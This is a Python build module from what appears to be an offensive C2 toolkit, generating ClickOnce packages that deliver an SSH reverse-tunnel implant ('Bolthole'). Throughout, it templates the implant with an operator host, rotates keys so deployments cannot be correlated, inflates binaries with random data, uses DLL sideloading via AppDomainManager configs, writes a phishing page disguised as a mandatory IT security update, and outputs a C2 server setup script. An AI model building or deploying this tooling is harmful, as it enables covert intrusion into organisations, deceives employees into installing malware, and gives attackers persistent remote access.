"""
BoltholeBuilder — builds ClickOnce packages with the Bolthole SSH-tunnel payload.
"""
import os
import re
import random
import string
import shutil
import subprocess
import tempfile
import traceback
import zipfile
from pathlib import Path
from string import Template
from tempfile import TemporaryDirectory

from .bolthole_models import BoltholePayload
from .bolthole_c2store import get_or_generate_keypair, load_keypair
from .logging import PerRequestLogger, GlobalLogger
from .misc import run_cmd_check_file
from .consts import (
    BUILD_DIR,
    BOLTHOLE_SRC_TEMPLATE_DIR,
    BOLTHOLE_BIN_TEMPLATE_DIR,
    BOLTHOLE_BUILD_CMD,
    BOLTHOLE_SIDELOAD_OPTIONS,
    DATA_CS_SIZE_IN_MB,
    TZSYNC, PERFWATSON, SVCHUB, POWERSHELL,
)


class BoltholeBuilder:
    def __init__(self, buildid: str, payload: BoltholePayload):
        self.buildid = buildid
        self.build_dir = os.path.join(BUILD_DIR, buildid)
        self._temp_dir = TemporaryDirectory(delete=False)
        self.temp_dir = self._temp_dir.name
        self.payload = payload
        self.logger = PerRequestLogger(buildid)
        self.tgt_dll = os.path.join(
            self.temp_dir, "bin", "x64", "Release", f"{payload.name}.dll"
        )
        self.sideload_exe = None
        self._port_list = []
        self._ssh_user_key_name = f"{payload.ssh_user}_key"

    def verify(self):
        if not re.match(r"^[a-zA-Z_][a-zA-Z0-9_]*$", self.payload.name):
            raise Exception("Application name does not match required regex")

        if not 0 <= self.payload.inflate <= 500:
            raise Exception("inflate must be between 0 and 500")

        if self.payload.sideload.lower() not in BOLTHOLE_SIDELOAD_OPTIONS:
            raise Exception("Invalid sideload option")

        if not self.payload.ssh_host.strip():
            raise Exception("ssh_host cannot be empty")

        try:
            self._port_list = [
                int(p.strip()) for p in self.payload.ports.split(",") if p.strip()
            ]
        except ValueError as exc:
            raise Exception("ports must contain only integers") from exc

        if not self._port_list:
            raise Exception("ports cannot be empty")

        for p in self._port_list:
            if not 1 <= p <= 65535:
                raise Exception(f"Port {p} is out of valid range 1-65535")

        if not 1 <= self.payload.tunnel_port <= 65535:
            raise Exception("tunnel_port out of valid range")

        if not 1 <= self.payload.socks_port <= 65535:
            raise Exception("socks_port out of valid range")

        priv, _ = load_keypair()
        if not priv:
            raise Exception(
                "No global outbound keypair found — save C2 config first via the UI "
                "so a keypair is generated before building"
            )

        self.logger.debug("Validated all Bolthole parameters")

    def copy_template_files(self):
        shutil.copytree(BOLTHOLE_SRC_TEMPLATE_DIR, self.temp_dir, dirs_exist_ok=True)
        boltfiles_dst = os.path.join(self.temp_dir, "BoltFiles")
        os.makedirs(boltfiles_dst, exist_ok=True)
        shutil.copytree(BOLTHOLE_BIN_TEMPLATE_DIR, boltfiles_dst, dirs_exist_ok=True)
        self.logger.debug("Copied template files to %s", self.temp_dir)

    def _generate_keypair(self, suffix: str, key_type: str = "ecdsa", bits: int = 256) -> tuple[str, str]:
        """Generate a temporary SSH keypair, return (private, public) as strings."""
        tmp_keyfile = None
        try:
            with tempfile.NamedTemporaryFile(suffix=suffix, delete=False) as tmp:
                tmp_keyfile = tmp.name
            os.unlink(tmp_keyfile)  # ssh-keygen refuses to overwrite an existing file
            subprocess.run(
                ["ssh-keygen", "-t", key_type, "-b", str(bits), "-f", tmp_keyfile, "-N", ""],
                check=True,
                capture_output=True,
            )
            with open(tmp_keyfile, "r") as f:
                private_key = f.read()
            with open(tmp_keyfile + ".pub", "r") as f:
                public_key = f.read()
        finally:
            if tmp_keyfile and os.path.exists(tmp_keyfile):
                os.unlink(tmp_keyfile)
            pub = (tmp_keyfile or "") + ".pub"
            if os.path.exists(pub):
                os.unlink(pub)
        return private_key, public_key

    def generate_operator_keys(self):
        """Generate fresh keypairs per build.

        Operator keypair (ECDSA-256):
          Private key → build_dir/operator_key (downloaded by operator).
          Public key  → temp_dir/BoltFiles/authorized_keys (embedded in package).

        boltd host keypair (RSA-2048):
          Private key → temp_dir/BoltFiles/bolt_key (replaces static template copy).
          Unique per build so deployments can't be correlated by host fingerprint.
        """
        private_key, public_key = self._generate_keypair("_bolthole_opkey")

        operator_key_path = os.path.join(self.build_dir, "operator_key")
        with open(operator_key_path, "w") as f:
            f.write(private_key)
        self.logger.debug("Wrote operator private key to %s", operator_key_path)

        auth_keys_path = os.path.join(self.temp_dir, "BoltFiles", "authorized_keys")
        with open(auth_keys_path, "w") as f:
            f.write(public_key)
            extra = self.payload.operator_pubkey.strip()
            if extra:
                f.write("\n" + extra + "\n")
        self.logger.debug("Wrote authorized_keys to %s", auth_keys_path)

        # Rotate boltd host key — overwrite the static template copy so each
        # deployment presents a unique fingerprint, preventing cross-target correlation.
        bolt_host_private, _ = self._generate_keypair("_bolthole_hostkey", key_type="rsa", bits=2048)
        bolt_key_path = os.path.join(self.temp_dir, "BoltFiles", "bolt_key")
        with open(bolt_key_path, "w", newline="\n") as f:
            f.write(bolt_host_private)
        self.logger.debug("Rotated bolt_key host key for build %s", self.buildid)

    def template_files(self):
        # Rename project files to match payload name
        for ext in ("csproj", "manifest", "application"):
            os.rename(
                os.path.join(self.temp_dir, f"project.{ext}"),
                os.path.join(self.temp_dir, f"{self.payload.name}.{ext}"),
            )

        # Template Program.cs
        program_cs = os.path.join(self.temp_dir, "Program.cs")
        with open(program_cs, "r") as f:
            content = f.read()

        port_array = ", ".join(str(p) for p in self._port_list)
        content = content.replace("REPLACE_SSH_HOST", self.payload.ssh_host)
        content = content.replace("REPLACE_USERNAME", self.payload.ssh_user)
        content = content.replace("REPLACE_PORT_ARRAY", port_array)
        content = content.replace("REPLACE_SOCKS_PORT", str(self.payload.socks_port))
        content = content.replace("REPLACE_TUNNEL_PORT", str(self.payload.tunnel_port))
        content = content.replace(
            "REPLACE_STARTUP_DELAY_MS", str(self.payload.startup_delay * 1000)
        )
        content = content.replace(
            "REPLACE_RECONNECT_DELAY_MS", str(self.payload.reconnect_delay * 1000)
        )
        content = content.replace("REPLACE_KEYFILE_NAME", self._ssh_user_key_name)

        with open(program_cs, "w") as f:
            f.write(content)
        self.logger.debug("Templated Program.cs")

        # Write boltd-config
        boltd_config_path = os.path.join(self.temp_dir, "BoltFiles", "boltd-config")
        with open(boltd_config_path, "w") as f:
            f.write(f"Port {self.payload.tunnel_port}\n")
            f.write("ListenAddress 127.0.0.1\n")
            f.write("PubkeyAuthentication yes\n")
            f.write("PasswordAuthentication no\n")
            f.write("IgnoreRhosts yes\n")
        self.logger.debug("Wrote boltd-config with port %d", self.payload.tunnel_port)

        # Write the global outbound private key as {ssh_user}_key.
        # Always ensure a single trailing newline: Windows OpenSSH reports "invalid format" without it.
        key_path = os.path.join(self.temp_dir, "BoltFiles", self._ssh_user_key_name)
        priv, _ = get_or_generate_keypair()
        normalized_outbound_key = priv.replace("\r\n", "\n").replace("\r", "\n").rstrip("\n") + "\n"
        with open(key_path, "w", newline="\n") as f:
            f.write(normalized_outbound_key)
        self.logger.debug("Wrote global outbound key as %s", self._ssh_user_key_name)

        # Generate Data.cs for .text section inflation
        data_cs_file = os.path.join(self.temp_dir, "Data.cs")
        func_name = "".join(random.choices(string.ascii_letters, k=16))
        with open(data_cs_file, "w") as f:
            f.write(f"""
                namespace {self.payload.name}
                {{
                    internal class Data
                    {{
                        private static readonly byte[] data = new byte[]
                        {{
                """)

            max_data_cs = int(DATA_CS_SIZE_IN_MB)
            data_cs_size = (
                self.payload.inflate
                if self.payload.inflate <= max_data_cs
                else max_data_cs
            )
            self.logger.debug(
                "Creating Data.cs with %d MB inflation", data_cs_size
            )
            for _ in range(int(data_cs_size * 1024 * 1024 / 32)):
                byte_str = (
                    str(list(os.urandom(32))).replace("[", "").replace("]", ",\n")
                )
                f.write(byte_str)

            f.write(f"""
                        }};

                        static unsafe void {func_name}()
                        {{
                            fixed (byte* ptr = data)
                            {{
                            }}
                        }}
                    }}
                }}
            """)
        self.logger.debug(
            "Generated Data.cs size: %d", os.stat(data_cs_file).st_size
        )

        # Generate training.data for embedded resource overflow inflation
        max_data_cs_outer = int(DATA_CS_SIZE_IN_MB)
        training_data_size = (
            1
            if self.payload.inflate <= max_data_cs_outer
            else (self.payload.inflate - max_data_cs_outer) * 1024 * 1024
        )
        training_data_file = os.path.join(self.temp_dir, "training.data")
        with open(training_data_file, "wb") as f:
            f.write(os.urandom(training_data_size))
        self.logger.debug("Created training.data: %d bytes", training_data_size)

    def compile_artefacts(self):
        self.logger.debug("Building with: %s", BOLTHOLE_BUILD_CMD)
        curr_dir = os.getcwd()
        os.chdir(self.temp_dir)
        run_cmd_check_file(BOLTHOLE_BUILD_CMD, self.tgt_dll, self.logger)
        os.chdir(curr_dir)

    def prepare_files_in_build_dir(self):
        sideload_key = self.payload.sideload.lower()
        if sideload_key == "tzsync":
            self.sideload_exe = TZSYNC
        elif sideload_key == "perfwatson2":
            self.sideload_exe = PERFWATSON
        elif sideload_key == "systemhost":
            self.sideload_exe = SVCHUB
        else:
            self.sideload_exe = POWERSHELL

        # Sideload binary (already has .deploy extension in templates/bin/)
        shutil.copy(self.sideload_exe.path, self.build_dir)

        # Compiled Bolthole DLL
        shutil.copy(
            self.tgt_dll,
            os.path.join(self.build_dir, f"{self.payload.name}.dll.deploy"),
        )

        # AppDomainManager config — BoltDomain is the type, name is the assembly
        config_src = os.path.join(BOLTHOLE_SRC_TEMPLATE_DIR, "project.exe.config.deploy")
        with open(config_src, "r") as f:
            config_contents = f.read().replace("REPLACEASSEMBLYNAME", self.payload.name)
        with open(
            os.path.join(self.build_dir, f"{self.sideload_exe.exe}.config.deploy"), "w"
        ) as f:
            f.write(config_contents)

        # BoltFiles — copy everything from temp_dir/BoltFiles/ with .deploy extension
        boltfiles_src = os.path.join(self.temp_dir, "BoltFiles")
        boltfiles_dst = os.path.join(self.build_dir, "BoltFiles")
        os.makedirs(boltfiles_dst, exist_ok=True)
        for fname in os.listdir(boltfiles_src):
            src_file = os.path.join(boltfiles_src, fname)
            if os.path.isfile(src_file):
                shutil.copy(src_file, os.path.join(boltfiles_dst, fname + ".deploy"))

        self.logger.debug("Populated build dir: DLL, sideload, config, BoltFiles")

    def template_manifests(self):
        boltfiles_dst = os.path.join(self.build_dir, "BoltFiles")

        def sz(path):
            return os.stat(path).st_size

        dll_deploy = os.path.join(self.build_dir, f"{self.payload.name}.dll.deploy")
        cfg_deploy = os.path.join(
            self.build_dir, f"{self.sideload_exe.exe}.config.deploy"
        )

        # Write assembly manifest
        manifest_src = os.path.join(BOLTHOLE_SRC_TEMPLATE_DIR, "project.manifest")
        with open(manifest_src, "r") as f:
            manifest_tmpl = f.read()

        manifest_path = os.path.join(
            self.build_dir, f"{self.payload.name}.manifest"
        )
        with open(manifest_path, "w") as f:
            f.write(
                Template(manifest_tmpl).safe_substitute(
                    clickonce_name=self.payload.name,
                    dll_size=sz(dll_deploy),
                    assembly_name=self.sideload_exe.name,
                    assembly_version=self.sideload_exe.version,
                    assembly_key=self.sideload_exe.key,
                    assembly_size=self.sideload_exe.size,
                    assembly_config_size=sz(cfg_deploy),
                    boltd_size=sz(
                        os.path.join(boltfiles_dst, "boltd.exe.deploy")
                    ),
                    boltcon_size=sz(
                        os.path.join(boltfiles_dst, "boltcon.exe.deploy")
                    ),
                    libcrypto_size=sz(
                        os.path.join(boltfiles_dst, "libcrypto.dll.deploy")
                    ),
                    bolt_key_size=sz(
                        os.path.join(boltfiles_dst, "bolt_key.deploy")
                    ),
                    boltd_config_size=sz(
                        os.path.join(boltfiles_dst, "boltd-config.deploy")
                    ),
                    authorized_keys_size=sz(
                        os.path.join(boltfiles_dst, "authorized_keys.deploy")
                    ),
                    ssh_user_key_name=self._ssh_user_key_name,
                    ssh_user_key_size=sz(
                        os.path.join(
                            boltfiles_dst, f"{self._ssh_user_key_name}.deploy"
                        )
                    ),
                )
            )
        self.logger.debug("Wrote manifest: %s", manifest_path)

        # Write deployment manifest (.application)
        app_src = os.path.join(BOLTHOLE_SRC_TEMPLATE_DIR, "project.application")
        with open(app_src, "r") as f:
            app_tmpl = f.read()

        app_path = os.path.join(self.build_dir, f"{self.payload.name}.application")
        with open(app_path, "w") as f:
            f.write(
                Template(app_tmpl).safe_substitute(
                    clickonce_name=self.payload.name,
                    version=self.payload.version,
                    provider_url=self.payload.provider_url,
                    manifest_size=sz(manifest_path),
                )
            )
        self.logger.debug("Wrote application: %s", app_path)

    def zip_package(self):
        target_extensions = (".deploy", ".manifest", ".application")
        source_path = Path(self.build_dir)
        matching_files = []
        for ext in target_extensions:
            matching_files.extend(source_path.glob(f"**/*{ext}"))

        if not matching_files:
            raise Exception("No files to zip found")

        output_zip = os.path.join(self.build_dir, f"{self.payload.name}.zip")
        with zipfile.ZipFile(output_zip, "w", zipfile.ZIP_DEFLATED) as zf:
            for file_path in matching_files:
                if file_path.is_file():
                    relative_path = file_path.relative_to(source_path)
                    zf.write(file_path, relative_path)
                    os.remove(file_path)
                    self.logger.debug("Zipped: %s", relative_path)

        self.logger.info(
            "Created %s with %d files", output_zip, len(matching_files)
        )

    def generate_phish_page(self):
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IT Service Portal</title>
    <style>
        body {{
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .card {{
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.12);
            padding: 48px 40px;
            max-width: 480px;
            width: 100%;
            text-align: center;
        }}
        .logo {{
            font-size: 2rem;
            font-weight: 700;
            color: #0078d4;
            margin-bottom: 8px;
        }}
        h1 {{
            font-size: 1.4rem;
            color: #1a1a1a;
            margin: 0 0 12px;
        }}
        p {{
            color: #555;
            line-height: 1.6;
            margin-bottom: 32px;
        }}
        .btn {{
            display: inline-block;
            background: #0078d4;
            color: white;
            padding: 14px 32px;
            border-radius: 4px;
            text-decoration: none;
            font-weight: 600;
            font-size: 1rem;
            transition: background 0.2s;
        }}
        .btn:hover {{ background: #005a9e; }}
        .note {{
            margin-top: 24px;
            font-size: 0.82rem;
            color: #888;
        }}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">IT Portal</div>
        <h1>Mandatory Software Update</h1>
        <p>A required security update has been approved for deployment on your device.
           Please install it at your earliest convenience to remain compliant with
           organizational policy.</p>
        <a href="{self.payload.provider_url}" class="btn">Download &amp; Install Update</a>
        <p class="note">This update is digitally signed and verified by your IT department.</p>
    </div>
</body>
</html>"""
        phish_path = os.path.join(self.build_dir, "phish.html")
        with open(phish_path, "w") as f:
            f.write(html)
        self.logger.debug("Wrote phish.html")

    def generate_c2_setup(self):
        ports_ufw = " ".join(str(p) for p in self._port_list)
        ports_list_str = ", ".join(str(p) for p in self._port_list)

        _, pub = load_keypair()
        c2_public_key = pub.strip() if pub else "# PASTE YOUR OUTBOUND SSH PUBLIC KEY HERE"
        self.logger.debug("Using global outbound public key for c2_setup.sh")

        script = f"""#!/usr/bin/env bash
# Bolthole C2 Setup Script
# ssh_host : {self.payload.ssh_host}
# ssh_user : {self.payload.ssh_user}
# ports    : {ports_list_str}
# tunnel   : {self.payload.tunnel_port}
# socks5   : {self.payload.socks_port}
set -e

SSH_USER="{self.payload.ssh_user}"
TUNNEL_PORT={self.payload.tunnel_port}

echo "[*] Creating user $SSH_USER (nologin shell) ..."
id "$SSH_USER" &>/dev/null || useradd -m -s /usr/sbin/nologin "$SSH_USER"

echo "[*] Configuring authorized_keys for $SSH_USER ..."
mkdir -p /home/$SSH_USER/.ssh
chmod 700 /home/$SSH_USER/.ssh
cat >> /home/$SSH_USER/.ssh/authorized_keys << 'PUBKEY'
{c2_public_key}
PUBKEY
chmod 600 /home/$SSH_USER/.ssh/authorized_keys
chown -R "$SSH_USER:$SSH_USER" /home/$SSH_USER/.ssh

echo "[*] Updating sshd_config ..."
grep -qxF 'AllowTcpForwarding yes' /etc/ssh/sshd_config || \\
    echo 'AllowTcpForwarding yes' >> /etc/ssh/sshd_config
grep -qxF 'GatewayPorts yes'       /etc/ssh/sshd_config || \\
    echo 'GatewayPorts yes'       >> /etc/ssh/sshd_config
grep -qxF "AllowUsers $SSH_USER"   /etc/ssh/sshd_config || \\
    echo "AllowUsers $SSH_USER"   >> /etc/ssh/sshd_config

echo "[*] Adding extra SSH listen ports ({ports_list_str}) ..."
for PORT in {ports_ufw}; do
    [ "$PORT" -eq 22 ] && continue
    grep -qxF "Port $PORT" /etc/ssh/sshd_config || \\
        echo "Port $PORT" >> /etc/ssh/sshd_config
done

echo "[*] Restarting sshd ..."
service ssh restart

echo "[*] Opening firewall ports ({ports_list_str}) ..."
if which ufw &>/dev/null; then
    for PORT in {ports_ufw}; do
        ufw allow "$PORT"/tcp
    done
    ufw reload
fi

echo "[+] Done. When a target connects:"
echo "    ssh -i operator_key -p $TUNNEL_PORT $SSH_USER@<this-host>"
"""
        setup_path = os.path.join(self.build_dir, "c2_setup.sh")
        with open(setup_path, "w") as f:
            f.write(script)
        self.logger.debug("Wrote c2_setup.sh")


def bolthole_build_func(buildid: str, payload: BoltholePayload):
    """Background task: orchestrate the full Bolthole build pipeline."""
    try:
        builder = BoltholeBuilder(buildid, payload)
        builder.logger.debug("%s", payload)

        if not os.path.exists(BOLTHOLE_SRC_TEMPLATE_DIR):
            builder.logger.error(
                "Bolthole template dir %s not found", BOLTHOLE_SRC_TEMPLATE_DIR
            )
            raise FileNotFoundError(
                f"Bolthole template dir {BOLTHOLE_SRC_TEMPLATE_DIR} not found"
            )

        builder.verify()
        builder.copy_template_files()
        builder.generate_operator_keys()
        builder.template_files()
        builder.compile_artefacts()
        builder.prepare_files_in_build_dir()
        builder.template_manifests()
        builder.zip_package()
        builder.generate_phish_page()
        builder.generate_c2_setup()

    except Exception as exc:  # pylint: disable=broad-except
        GlobalLogger.error("Bolthole build exception: %s", exc)
        GlobalLogger.error("Traceback: %s", traceback.format_exc())
